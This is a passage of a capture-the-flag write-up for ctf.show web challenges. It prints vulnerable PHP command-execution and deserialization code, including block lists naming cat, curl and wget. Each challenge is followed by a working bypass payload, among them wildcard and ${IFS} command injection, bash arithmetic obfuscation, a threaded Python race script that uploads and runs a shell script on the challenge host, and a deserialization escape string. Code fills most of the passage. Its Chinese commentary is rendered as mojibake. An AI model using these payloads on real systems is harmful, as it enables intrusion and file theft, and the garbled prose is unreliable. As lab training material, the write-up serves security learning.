class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;tac%09fla?.???%09%23</span><br></pre></td></tr></table></figure><h3 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t&lt;&gt;fl&#39;&#39;ag.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t&lt;&gt;fl&#39;&#39;ag.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t$&#123;IFS&#125;&#x2F;fl&#39;&#39;ag%0a%23</span><br></pre></td></tr></table></figure><h3 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ca&#39;&#39;t$&#123;IFS&#125;fl&#39;&#39;ag.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šé…ç¬¦ç»•è¿‡ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???.php%0a%23</span><br></pre></td></tr></table></figure><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>å’Œçº¢åŒ…é¢˜ä¸€æ ·ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&#x27;http://0a73a501-052c-43c7-b811-01cd759d416a.chall.ctf.show/?c=.+/???/????????[@-[]&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://0a73a501-052c-43c7-b811-01cd759d416a.chall.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">    files=&#123;</span><br><span class="line">    <span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;#!/bin/sh\necho 1433223\ncat flag.php&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url,files=files)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    r=requests.get(url1)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;1433223&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    threading.Thread(target=post,args=()).start()</span><br><span class="line">    threading.Thread(target=req,args=()).start()</span><br></pre></td></tr></table></figure><p><code>[@-[]</code>ä»£è¡¨æ˜¯å¤§å†™å­—æ¯çš„é€šé…ç¬¦</p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œweb55ä¸€æ ·</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è‡ªå·±æµ‹å¾—ä¸‹é¢çš„payloadåœ¨bashé‡Œå¯ä»¥ï¼Œåœ¨systemå‡½æ•°ä¸è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$((((_++)),$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_))</span><br><span class="line"></span><br><span class="line">$[((_++)),$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_+$_]</span><br></pre></td></tr></table></figure><p>æ­£ç¡®çš„è§£æ³•æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>è®°ä¸‹å¤§æ¦‚æ€è·¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(())   &#x3D;&#x3D;&gt; 0</span><br><span class="line">$((~$(())))   &#x3D;&#x3D;&gt; -1</span><br><span class="line">$(($((~$(())))$((~$(())))))  &#x3D;&#x3D;&gt; -2</span><br><span class="line">$((~-37))   &#x3D;&#x3D;&gt; 36</span><br></pre></td></tr></table></figure><h2 id="æœˆé¥¼æ¯"><a href="#æœˆé¥¼æ¯" class="headerlink" title="æœˆé¥¼æ¯"></a>æœˆé¥¼æ¯</h2><h3 id="web1-æ­¤å¤œåœ†"><a href="#web1-æ­¤å¤œåœ†" class="headerlink" title="web1_æ­¤å¤œåœ†"></a>web1_æ­¤å¤œåœ†</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $uname;</span><br><span class="line"><span class="keyword">public</span> $password;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line"><span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œç”±äºæ˜¯å˜é•¿ï¼Œå› æ­¤å¿…é¡»æ·»åŠ <code>&quot;</code>æŠŠå‰é¢çš„é—­åˆäº†ï¼Œåˆ¤æ–­éœ€æ·»åŠ çš„å­—ç¬¦ä¸²ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><p>åˆ—æ–¹ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">11n &#x3D; 9n+ 30 +k</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; n&#x3D;15  k&#x3D;0</span><br></pre></td></tr></table></figure><p>æ„é€ payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="web2-æ•…äººå¿ƒ"><a href="#web2-æ•…äººå¿ƒ" class="headerlink" title="web2_æ•…äººå¿ƒ"></a>web2_æ•…äººå¿ƒ</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b=$_GET[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">$c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">$url[<span class="number">1</span>]=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($a) <span class="keyword">and</span> strlen($a)&lt;<span class="number">7</span> <span class="keyword">and</span> $a!=<span class="number">0</span> <span class="keyword">and</span> $a**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    $d = ($b==hash(<span class="string">&quot;md2&quot;</span>, $b)) &amp;&amp; ($c==hash(<span class="string">&quot;md2&quot;</span>,hash(<span class="string">&quot;md2&quot;</span>, $c)));</span><br><span class="line">    <span class="keyword">if</span>($d)&#123;</span><br><span class="line">             highlight_file(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(filter_var($url[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[<span class="number">1</span>]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,$host[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å…³è¯•å°±å®Œäº‹äº†ï¼ŒçŒœæµ‹æ˜¯ç²¾åº¦é—®é¢˜ï¼Œåæ¥æ‰çŸ¥é“phpå°æ•°ç‚¹åè¶…è¿‡161ä½åšå¹³æ–¹è¿ç®—æ—¶ä¼šè¢«æˆªæ–­ï¼Œä½†æ˜¯è¶…è¿‡323ä½åˆä¼šå¤±æ•ˆã€‚ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ä»£æ›¿ï¼Œå³ <code>1e-162 åˆ° 1e-323</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;1e-300</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå…³md2å¼±æ¯”è¾ƒï¼Œå†™è„šæœ¬è·‘å§ï¼Œrobotsé‡Œæœ‰æç¤º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md2</span>(<span class="params">s</span>):</span></span><br><span class="line">    obj = MD2.new()</span><br><span class="line">    obj.update(s.encode())</span><br><span class="line">    <span class="keyword">return</span> obj.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span 